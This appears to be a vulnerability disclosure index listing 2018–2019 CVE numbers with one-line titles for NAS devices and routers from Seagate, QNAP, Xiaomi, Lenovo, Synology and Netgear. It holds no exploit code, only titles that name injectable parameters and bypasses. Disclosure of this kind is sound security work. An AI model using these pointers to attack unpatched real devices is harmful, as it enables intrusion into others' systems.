CVE-2018-12319 – Login Denial of service<br>
CVE-2018-12315 – Password change does not require existing password<br>
CVE-2018-12318 – snmp.cgi Returns Password in Cleartext<br>
CVE-2018-12317 – Command Injection in group.cgi<br>
Seagate STCR3000101<br>
CVE-2018-12298 – Lack of path canonicalization in filebrowser app<br>
CVE-2018-12295 – Failure to sanitize user input in SQL statements<br>
CVE-2018-12299 – Insufficient validation and sanitization on user supplied file names<br>
CVE-2018-12303 – Insufficient validation and sanitization on user supplied directory names<br>
CVE-2018-12297 – Insufficient validation and sanitization on API endpoints<br>
CVE-2018-12300 – Arbitrary Redirect<br>
CVE-2018-12302 – Missing Cookie Hardening Flags<br>
CVE-2018-12296 – Server Information Disclosure<br>
CVE-2018-12304 – Missing Output Sanitization in App Manager<br>
CVE-2018-12301 – Download Manager Allows Using localhost and 127.0.0.1<br>
QNAP TS-870<br>
CVE-2018-19941 – Username and Password Stored as Cookies During Login Redirect<br>
CVE-2018-19942 – Insecure “Open” Functionality in Filemanager<br>
CVE-2018-19943 – Missing Input Sanitization on File names<br>
CVE-2018-19944 – SNMP Passwords Returned in Plaintext<br>
CVE-2018-19945 – Arbitrary Path File Upload<br>
CVE-2018-19946 – Missing Certificate Validation When Issuing cURL Requests<br>
CVE-2018-19947 – Verbose Error Messages (File Upload PHP File Path Disclosure)<br>
CVE-2018-19948 – CSRF File Upload (Helpdesk)<br>
CVE-2018-19949 – Command Injection In Username On Proper Authentication After Account Creation<br>
CVE-2018-19950 – Command Injection In UserName In Music Station In File Upload Functionality When Uploading Content to Private Collection<br>
CVE-2018-19951 – Stored XSS In File Name In Music Station<br>
CVE-2018-19952 – SQLi in Mediatool API for Shared Playlist Link Log Viewing<br>
CVE-2018-19953 – Missing Output Sanitization on FileStation Shared Link Creator<br>
CVE-2018-19954 – Persistent Cross-Site Scripting in PhotoStation Filenames<br>
CVE-2018-19955 – Reflected Cross-Site Scripting in PhotoStation Filenames<br>
CVE-2018-19956 – Reflected Cross-Site Scripting in PhotoStation via URL Parameters<br>
CVE-2018-19957 – Missing Hardening Headers<br>
Mi Router<br>
CVE-2018-16130 – Insufficient Shell Input Validation in request_mitv Functionality<br>
CVE-2018-13023 – Insufficient Shell Input Validation in wifi_access Functionality<br>
CVE-2018-13022 – Reflected Sniffed Cross-Site Scripting via API 404<br>
Lenovo ix4-300d<br>
CVE-2018-9074 – Arbitrary File Path Selection When Uploading Files<br>
CVE-2018-9075 – System Command Injection in client:password parameter in PersonalCloudJoin<br>
CVE-2018-9076 – System Command Injection in name parameter in ShareModify<br>
CVE-2018-9077 – System Command Injection in share:name parameter in ShareModify<br>
CVE-2018-9078 – Insufficient validation and sanitization when hosting SVG images<br>
CVE-2018-9079 – Insufficient validation and sanitization in cat URL parameter<br>
CVE-2018-9080 – Session Fixation via iomega Cookie<br>
CVE-2018-9081 – Insufficient validation and sanitization in file parameter<br>
CVE-2018-9082 – Password change does not require existing password<br>
Synology DS218j<br>
CVE-2018-13282 – Session Fixation in Photo Station Application<br>
CVE-2018-13281 – Determine Existence and Metadata of Arbitrary Files<br>
Netgear Nighthawk X10-R9000<br>
CVE-2019-12510 – Authentication bypass via X-Forwarded-For header<br>
CVE-2019-12511 – System command injection via SOAP API<br>
CVE-2019-12512 – Cross-site scripting via X-Forwarded-For header<br>
CVE-2019-12513 – Cross-site scripting in logs via malicious DHCP request
